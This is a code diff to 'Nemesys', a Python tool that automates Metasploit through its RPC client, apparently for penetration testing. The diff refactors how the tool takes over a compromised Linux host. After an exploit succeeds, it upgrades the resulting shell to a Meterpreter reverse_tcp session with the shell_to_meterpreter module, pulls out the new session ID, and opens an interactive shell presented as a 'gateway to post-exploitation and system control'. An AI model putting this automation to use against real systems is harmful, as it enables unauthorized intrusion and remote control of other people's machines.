@@ -44,41 +44,75 @@ class Nemesys:
         if exploit_uuid:
             session_id = self._get_session_id(exploit_uuid)
             if session_id:
-                self.upgrade_session(int(session_id))
-                self.post_explotation(int(session_id) + 1)
+                new_session_id = self._upgrade_session(int(session_id))
+                ##self.post_explotation(int(session_id) + 1)
                 ##self._enumerate_system(session_id)
-                self._open_shell(int(session_id) + 2)
+                self._open_shell(new_session_id)
             else:
                 logger.error("❌ No session was established.")
         else:
             logger.error("❌ Exploit execution failed.")
 
     
-    def upgrade_session(self, session_id):
+    def _upgrade_session(self, session_id):
         """
-        Realiza el upgrade de una shell básica a Meterpreter utilizando el módulo 'shell_to_meterpreter'.
+        Upgrades a basic shell session to Meterpreter using the 'shell_to_meterpreter' module.
 
         Args:
-            session_id (int): ID de la sesión activa.
+            session_id (int): ID of the active shell session.
 
         Returns:
-            None
+            int: New Meterpreter session ID if upgrade was successful, None otherwise.
         """
         console_id = self.client.consoles.console().cid
         exploit_module = 'multi/manage/shell_to_meterpreter'
+        new_session_id = None
 
-        self.client.consoles.console(console_id).write(f'use {exploit_module}\n')
-        self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
-        self.client.consoles.console(console_id).write(f'set PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp\n')
-        self.client.consoles.console(console_id).write(f'set PLATFORM_OVERRIDE linux\n')
-        self.client.consoles.console(console_id).write('run\n')
+        try:
+            logger.info("🚀 Initiating session upgrade to Meterpreter...")
+            logger.debug(f"🔍 Using exploit module: {exploit_module}")
 
-        time.sleep(30)
+            # Configure the exploit module
+            self.client.consoles.console(console_id).write(f'use {exploit_module}\n')
+            self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
+            self.client.consoles.console(console_id).write(f'set PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp\n')
+            self.client.consoles.console(console_id).write(f'set PLATFORM_OVERRIDE linux\n')
+            
+            logger.info(f"🔧 Running the upgrade for session {session_id}...")
+            self.client.consoles.console(console_id).write('run\n')
 
-        output = self.client.consoles.console(console_id).read()
-        print("Resultados obtenidos del upgrade:")
-        print(output['data'])
-        self.client.consoles.console(console_id).destroy()
+            # Wait for the upgrade process to complete
+            time.sleep(30)
+
+            # Read the console output
+            output = self.client.consoles.console(console_id).read()
+            upgrade_output = output.get('data', '')
+
+            # Check the output for a new Meterpreter session ID
+            if "Meterpreter session" in upgrade_output:
+                # Extract the new session ID using a regular expression
+                match = re.search(r'Meterpreter session (\d+) opened', upgrade_output)
+                if match:
+                    new_session_id = int(match.group(1))
+                    logger.info(f"✅ New Meterpreter session established: Session ID {new_session_id}")
+                else:
+                    logger.warning("⚠️ Could not extract the new session ID from the output.")
+            elif "Post module execution completed" in upgrade_output:
+                logger.info("✅ Upgrade module execution completed, but no new session ID found.")
+            elif "Exploit failed" in upgrade_output or "No session was created" in upgrade_output:
+                logger.error("❌ Session upgrade failed: No Meterpreter session created.")
+            else:
+                logger.warning("⚠️ Unknown status. The upgrade process may not have completed as expected.")
+
+        except Exception as e:
+            logger.error(f"⚠️ Error during session upgrade: {e}")
+
+        finally:
+            # Clean up the console session
+            self.client.consoles.console(console_id).destroy()
+            logger.info("🧹 Console session destroyed after upgrade attempt.")
+
+        return new_session_id
 
     def post_explotation(self, session_id):
         """Realiza acciones de post-explotación, recogiendo información relevante.
@@ -169,7 +203,7 @@ class Nemesys:
         while time.time() < end_time:
             try:
                 # Try to access the session
-                shell = self.client.sessions.session(session_id)
+                shell = self.client.sessions.session(str(session_id))
                 logger.info(f"💀 Session {session_id} is now active!")
                 break  # Exit loop if session is found
             except KeyError:
@@ -180,15 +214,20 @@ class Nemesys:
             logger.error(f"❌ Session ID {session_id} does not exist after waiting.")
             return  # Exit early if session is not found.
 
-        # Determine if the session is a Meterpreter shell
-        is_meterpreter = 'meterpreter' in shell.name.lower()
+        # Check if the session is a Meterpreter session
+        session_info = self.client.sessions.list.get(str(session_id), {})
+        is_meterpreter = session_info.get('type', '').lower() == 'meterpreter'
 
         banner = """
-        ========================================================
-        💀 Welcome to the Nemesys Shell Interface 💀
-        (Type 'exit' to leave)
-        ========================================================
+        ╔════════════════════════════════════════════════════════════╗
+        ║            💀 Welcome to the Nemesys Shell Interface 💀            ║
+        ║────────────────────────────────────────────────────────────║
+        ║  ⚔️  Your gateway to post-exploitation and system control.   ║
+        ║  🔍  Type 'help' for available commands.                     ║
+        ║  🚪  Type 'exit' to leave the interactive session.           ║
+        ╚════════════════════════════════════════════════════════════╝
         """
+
         logger.info(banner)
 
         try:
